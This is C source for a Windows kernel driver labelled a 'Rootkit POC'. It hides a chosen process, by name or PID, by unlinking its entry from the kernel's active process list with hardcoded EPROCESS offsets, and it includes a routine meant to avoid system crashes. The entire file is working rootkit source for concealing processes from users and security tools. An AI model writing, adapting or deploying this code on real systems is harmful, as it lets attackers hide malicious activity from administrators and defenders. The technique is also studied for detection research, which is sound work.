#include <ntddk.h>

typedef struct _HideProcessData
{
    char *HideBy;
    char *ProcessName;
    UINT32 ProcessPid;
    BOOLEAN AvoidBSOD;
} HideProcessData;

VOID
AvoidBSOD_RemoveProcessLinks(
    _In_ PLIST_ENTRY CurrListEntry
)
{
    PLIST_ENTRY Previous, Next;
    Previous = (CurrListEntry->Blink);
    Next = (CurrListEntry->Flink);

    DbgPrint("Rootkit POC: Remove entry list");
    Previous->Flink = Next;
    Next->Blink = Previous;

    DbgPrint("Rootkit POC: Avoid BSOD");
    CurrListEntry->Blink = (PLIST_ENTRY)&CurrListEntry->Flink;
    CurrListEntry->Flink = (PLIST_ENTRY)&CurrListEntry->Flink;

    return;
}

VOID
WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
    _In_ UINT32 pid,
    _In_ BOOLEAN AvoidBSOD
)
{
    UINT32 *currUniqueProcessId = NULL;

    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;

    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;

    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;

        currUniqueProcessId = (UINT32 *)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);

        if (*(UINT32 *)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
        {
            DbgPrint("Rootkit POC: Hide Process -> Pid (%p)", currUniqueProcessId);

            if (AvoidBSOD)
            {
                AvoidBSOD_RemoveProcessLinks(CurrListEntry);
            }
            else
            {
                RemoveEntryList(CurrListEntry);
            }
        }

        CurrListEntry = NextListEntry;
    }
}

VOID
WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
    _In_ char *ProcessName,
    _In_ BOOLEAN AvoidBSOD
)
{
    char *currImageFileName = NULL;

    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;

    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;

    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;

        currImageFileName = (char *)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);

        if (strcmp(currImageFileName, ProcessName) == 0 && MmIsAddressValid(CurrListEntry))
        {
            DbgPrint("Rootkit POC: Hide Process -> Name (%s)", currImageFileName);

            if (AvoidBSOD)
            {
                AvoidBSOD_RemoveProcessLinks(CurrListEntry);
            }
            else
            {
                RemoveEntryList(CurrListEntry);
            }
        }

        CurrListEntry = NextListEntry;
    }
}

VOID
DriverUnload(
    _In_ PDRIVER_OBJECT pDriverObject
)
{
    UNREFERENCED_PARAMETER(pDriverObject);

    DbgPrint("Rootkit POC: Unloading... Service has stopped");
}

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT pDriverObject,
    _In_ PUNICODE_STRING pRegistryPath
)
{
    UNREFERENCED_PARAMETER(pRegistryPath);

    pDriverObject->DriverUnload = DriverUnload;

    DbgPrint("Rootkit POC: Loading... Hello World");

    HideProcessData structHideProcessData;
    structHideProcessData.HideBy = "NAME";
    structHideProcessData.ProcessName = "mspaint.exe";
    structHideProcessData.ProcessPid = 10456;
    structHideProcessData.AvoidBSOD = TRUE;

    if (strcmp(structHideProcessData.HideBy, "NAME") == 0)
    {
        WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(structHideProcessData.ProcessName, structHideProcessData.AvoidBSOD);
    }
    else if (strcmp(structHideProcessData.HideBy, "PID") == 0)
    {
        WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(structHideProcessData.ProcessPid, structHideProcessData.AvoidBSOD);
    }
    else
    {
        DbgPrint("Rootkit POC Failed: Invalid HideBy value -> %s", structHideProcessData.HideBy);
    }

    return STATUS_SUCCESS;
}
